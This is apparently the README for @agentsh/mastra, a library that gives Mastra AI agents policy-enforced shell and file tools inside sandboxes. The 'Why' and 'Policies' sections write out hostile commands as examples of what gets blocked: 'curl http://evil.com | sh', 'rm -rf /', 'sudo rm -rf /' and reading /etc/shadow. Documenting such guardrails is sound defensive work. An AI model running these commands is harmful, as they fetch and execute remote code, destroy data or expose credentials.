# @agentsh/mastra

Secure, policy-enforced tools for [Mastra](https://mastra.ai) AI agents — powered by [AgentSH](https://agentsh.dev).

Give your agents `executeBash`, `readFile`, and `writeFile` tools that enforce security policies at the kernel level. One function call, any sandbox provider.

```typescript
import { agentshTools, agentDefault } from '@agentsh/mastra';
import { e2b } from '@agentsh/secure-sandbox/adapters/e2b';

const tools = agentshTools({
  policy: agentDefault(),
  sandbox: { adapter: e2b(sandbox) },
});
```

Three Mastra-compatible tools. Automatic policy enforcement. Works with E2B, Daytona, Vercel, Blaxel, Modal — or any sandbox you can wrap in an adapter.

## Why

LLM agents that can execute code need guardrails. Without them, a single hallucinated `rm -rf /` or `curl http://evil.com | sh` can destroy your sandbox or exfiltrate data.

AgentSH enforces security policies at the kernel level using seccomp and eBPF — not string matching, not prompt engineering. Policy violations are blocked before they execute and returned as structured results (exit code 126), not exceptions.

`@agentsh/mastra` wraps this into Mastra's tool system so your agent gets secure shell, file read, and file write capabilities with zero boilerplate.

## Features

- **One-call setup** — `agentshTools()` returns three ready-to-use Mastra tools
- **Kernel-level enforcement** — seccomp/eBPF policies, not string filters
- **Any sandbox provider** — E2B, Daytona, Vercel, Blaxel, Modal, or bring your own
- **Built-in policies** — `agentDefault()`, `devSafe()`, `ciStrict()`, composable with `merge()`
- **Graceful denials** — blocked commands return exit code 126 with explanation, no crashes
- **Works without Mastra** — call `tool.execute()` directly for scripted automation
- **Lazy initialization** — sandbox provisioning happens on first tool call, not at import

## Install

```bash
npm install @agentsh/mastra @agentsh/secure-sandbox
```

Then add your sandbox provider SDK:

```bash
# Pick one (or more):
npm install e2b                 # E2B
npm install @daytonaio/sdk      # Daytona
npm install @vercel/sandbox     # Vercel
npm install @blaxel/core        # Blaxel
pip install modal               # Modal (Python SDK)
```

## Quick Start

### With a Mastra Agent

```typescript
import { Agent } from '@mastra/core/agent';
import { agentshTools, agentDefault } from '@agentsh/mastra';
import { e2b } from '@agentsh/secure-sandbox/adapters/e2b';
import { Sandbox } from 'e2b';

const sandbox = await Sandbox.create('agentsh-sandbox');

const agent = new Agent({
  id: 'secure-coder',
  name: 'secure-coder',
  instructions: 'You are a coding assistant with a secure sandbox.',
  model: 'anthropic/claude-sonnet-4-20250514',
  tools: agentshTools({
    policy: agentDefault(),
    sandbox: { adapter: e2b(sandbox) },
  }),
});

const response = await agent.generate(
  'Write a Python script that prints Fibonacci numbers, save it, and run it.'
);
```

The agent gets `executeBash`, `readFile`, and `writeFile`. AgentSH blocks anything the policy doesn't allow — `sudo`, reading `/etc/shadow`, outbound network to unknown hosts — and returns a structured denial instead of crashing.

### Without a Mastra Agent

The tools work standalone. Call `.execute()` directly for scripted automation, testing, or non-Mastra workflows:

```typescript
import { agentshTools, agentDefault } from '@agentsh/mastra';
import { vercel } from '@agentsh/secure-sandbox/adapters/vercel';
import { Sandbox } from '@vercel/sandbox';

const sandbox = await Sandbox.create({ runtime: 'node24', timeout: 300_000 });
const tools = agentshTools({
  policy: agentDefault(),
  sandbox: { adapter: vercel(sandbox) },
});

// Direct execution — no agent needed
const result = await tools.executeBash.execute({ command: 'echo "Hello!"' }, {});
console.log(result.stdout); // Hello!

await tools.writeFile.execute({ path: '/workspace/app.js', content: 'console.log(42)' }, {});
const run = await tools.executeBash.execute({ command: 'node /workspace/app.js' }, {});
console.log(run.stdout); // 42
```

### Local Mode (No Sandbox)

For development, run against a local AgentSH installation:

```typescript
const tools = agentshTools({
  policy: agentDefault(),
  workspace: '/tmp/agent-workspace',
});
```

## Sandbox Providers

Any sandbox supported by `@agentsh/secure-sandbox` works. Create the sandbox with the provider's SDK, wrap it with the adapter, pass it to `agentshTools()`:

| Provider | Adapter | SDK |
|----------|---------|-----|
| [E2B](https://e2b.dev) | `@agentsh/secure-sandbox/adapters/e2b` | `e2b` |
| [Daytona](https://daytona.io) | `@agentsh/secure-sandbox/adapters/daytona` | `@daytonaio/sdk` |
| [Vercel](https://vercel.com/docs/sandbox) | `@agentsh/secure-sandbox/adapters/vercel` | `@vercel/sandbox` |
| [Blaxel](https://blaxel.ai) | `@agentsh/secure-sandbox/adapters/blaxel` | `@blaxel/core` |
| [Modal](https://modal.com) | `@agentsh/secure-sandbox/adapters/modal` | Python SDK (bridge) |

The pattern is always the same:

```typescript
import { agentshTools } from '@agentsh/mastra';
import { providerName } from '@agentsh/secure-sandbox/adapters/providerName';

const tools = agentshTools({
  sandbox: { adapter: providerName(rawSandbox) },
});
```

### Modal (Python Bridge)

Modal's SDK is Python-only. The `modal` adapter works with a Python subprocess bridge that communicates over JSON-line protocol. See [`examples/modal.ts`](examples/modal.ts) for the full pattern.

## Policies

Policies define what the agent can and cannot do. They're enforced at the kernel level — there's no way to bypass them from userspace.

```typescript
import { agentDefault, devSafe, ciStrict, merge } from '@agentsh/mastra';

// Built-in policies
agentDefault()  // Safe defaults for AI agents
devSafe()       // Development-oriented (more permissive)
ciStrict()      // CI/CD lockdown

// Compose policies
const custom = merge(agentDefault(), {
  network: { allow: ['api.example.com:443'] },
});

const tools = agentshTools({ policy: custom, sandbox: { adapter } });
```

When a command violates the policy, the tool returns a structured result:

```typescript
const result = await tools.executeBash.execute({ command: 'sudo rm -rf /' }, {});
// result.exitCode === 126
// result.stderr contains the denial reason
```

No exceptions. No crashes. The agent sees the denial and can adjust its approach.

## API

### `agentshTools(config?)`

Returns `{ executeBash, readFile, writeFile }` — three Mastra-compatible tools.

**Config:**

```typescript
interface AgentSHToolsConfig {
  policy?: PolicyDefinition;         // Security policy (default: agentDefault())
  workspace?: string;                // Local mode: working directory
  sandbox?: {
    adapter: SandboxAdapter;         // Sandbox provider adapter
    config?: Partial<SecureConfig>;  // AgentSH provisioning options
  };
}
```

**Tools:**

| Tool | Input | Output |
|------|-------|--------|
| `executeBash` | `{ command, cwd?, timeout? }` | `{ stdout, stderr, exitCode }` |
| `readFile` | `{ path }` | `{ content, success, error? }` |
| `writeFile` | `{ path, content }` | `{ success, error? }` |

## Examples

Run the examples to see it in action:

```bash
# Mastra agent with E2B sandbox
npx tsx examples/agent-e2b.ts

# Standalone tools with Vercel sandbox (no Mastra agent)
npx tsx examples/vercel.ts

# Standalone tools with Modal sandbox (Python bridge)
npx tsx examples/modal.ts
```

## Testing

```bash
# Unit tests (30 tests, no sandbox needed)
npm test

# E2E tests (requires provider credentials in .env.e2e)
npm run test:e2e:e2b
npm run test:e2e:daytona
npm run test:e2e:blaxel
npm run test:e2e:vercel
npm run test:e2e:modal
```

## License

Apache 2.0 — see [LICENSE](LICENSE).
